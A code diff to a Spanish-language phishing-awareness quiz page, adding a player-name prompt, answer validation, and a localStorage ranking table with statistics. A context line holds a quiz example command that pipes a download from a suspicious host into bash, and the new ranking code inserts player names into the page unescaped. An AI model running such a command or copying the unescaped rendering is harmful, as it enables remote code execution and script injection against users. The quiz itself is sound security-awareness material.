@@ -93,12 +93,39 @@ button {
     font-size: 20px;
     margin-top: 20px;
 }
+table {
+    width: 100%;
+    margin-top: 20px;
+    border-collapse: collapse;
+}
+
+td {
+    padding: 10px;
+    border-bottom: 1px solid #ccc;
+}
+
+tr:nth-child(1) {
+    background: gold;
+}
+
+tr:nth-child(2) {
+    background: silver;
+}
+
+tr:nth-child(3) {
+    background: #cd7f32;
+}
 </style>
 </head>
 
 <body>
 
 <h1>Detectas Phishing Sofisticado?</h1>
+
+<input type="text" id="nombre" placeholder="Ingresa tu nombre" required>
+<button onclick="iniciarQuiz()">Comenzar</button>
+
+
 
 <div class="quiz-container">
 
@@ -262,6 +289,12 @@ curl http://install-tool-free.xyz | bash</p>
 
 </div>
 
+<div id="ranking"></div>
+
+<div id="stats"></div>
+
+
+
 <script>
 const respuestas = {
     q1: {
@@ -340,6 +373,13 @@ document.querySelectorAll("input").forEach(input => {
 });
 
 function siguientePregunta() {
+    let seleccion = document.querySelector(`input[name="q${preguntaActual}"]:checked`);
+
+    if (!seleccion) {
+        alert("Responde la pregunta antes de continuar");
+        return;
+    }
+
     document.getElementById("q" + preguntaActual).classList.remove("active");
 
     preguntaActual++;
@@ -352,17 +392,88 @@ function siguientePregunta() {
 }
 
 function mostrarResultado() {
+    let nombre = localStorage.getItem("nombre");
+
+    // ✅ Guardar correctamente en localStorage
+    guardarResultado(nombre, puntaje);
+
     document.getElementById("quizForm").style.display = "none";
 
-    document.getElementById("result").innerHTML =
-        `Resultado: ${puntaje}/10<br>` +
-        (puntaje >= 8 ? "Nivel alto en ciberseguridad"
-        : puntaje >= 5 ? "Nivel medio"
-        : "Nivel bajo, cuidado con phishing");
+    document.getElementById("result").innerHTML = `
+        <h2>Resultado: ${puntaje}/10</h2>
+        <button onclick="mostrarRanking()">Ver Ranking</button>
+    `;
 
     document.getElementById("result").style.display = "block";
+
+    calcularStats(); 
 }
 
+function iniciarQuiz() {
+    let nombre = document.getElementById("nombre").value;
+
+    if (!nombre) {
+        alert("Ingresa tu nombre");
+        return;
+    }
+
+    localStorage.setItem("nombre", nombre);
+
+    document.getElementById("quizForm").style.display = "block";
+
+    
+    document.getElementById("nombre").style.display = "none";
+}
+function guardarResultado(nombre, puntaje) {
+    let resultados = JSON.parse(localStorage.getItem("ranking")) || [];
+
+    resultados.push({
+        nombre: nombre,
+        puntaje: puntaje,
+        fecha: new Date().toLocaleString()
+    });
+
+    localStorage.setItem("ranking", JSON.stringify(resultados));
+}
+
+function mostrarRanking() {
+    let resultados = JSON.parse(localStorage.getItem("ranking")) || [];
+
+    // Ordenar por puntaje
+    resultados.sort((a, b) => b.puntaje - a.puntaje);
+
+    let html = "<h2>🏆 Ranking</h2><table>";
+
+    resultados.forEach((user, i) => {
+        html += `
+            <tr>
+                <td>#${i + 1}</td>
+                <td>${user.nombre}</td>
+                <td>${user.puntaje}</td>
+                <td>${user.fecha}</td>
+            </tr>
+        `;
+    });
+
+    html += "</table>";
+
+    document.getElementById("ranking").innerHTML = html;
+}
+function calcularStats() {
+    let resultados = JSON.parse(localStorage.getItem("ranking")) || [];
+
+    if (resultados.length === 0) return;
+
+    let suma = resultados.reduce((acc, r) => acc + r.puntaje, 0);
+    let promedio = suma / resultados.length;
+    let max = Math.max(...resultados.map(r => r.puntaje));
+
+    document.getElementById("stats").innerHTML = `
+        <p>Promedio: ${promedio.toFixed(2)}</p>
+        <p>Máximo: ${max}</p>
+        <p>Intentos: ${resultados.length}</p>
+    `;
+}
 </script>
 
 </body>
